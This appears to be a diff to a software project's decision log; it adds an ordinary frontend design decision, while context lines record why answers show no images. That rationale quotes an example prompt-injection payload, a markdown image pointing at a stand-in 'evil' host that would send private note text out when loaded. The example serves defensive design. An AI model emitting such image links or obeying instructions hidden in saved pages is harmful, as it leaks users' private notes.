@@ -103,3 +103,9 @@ Major, hard-to-reverse decisions. Newest last.
 - Why: saved web pages may hide instructions. An injected `![](https://evil/?d=<note text>)` would leak private notes as soon as the image loads.
 - Trade-off: answers cannot show images.
 - Rejected: trusting saved content as it is.
+
+## D18: Newsprint visual design via Hallmark (2026-11-19)
+- Decision: the frontend uses the Hallmark Newsprint theme: serif type, square rules instead of cards, one brick accent, light and dark from one token set. shadcn components are kept but restyled in place.
+- Why: the stock shadcn neutral look read as generated; a reading tool with citations fits a newspaper style.
+- Trade-off: lower density than a sans UI; shadcn upgrades need the restyle re-applied.
+- Rejected: keeping the shadcn defaults; replacing shadcn components.
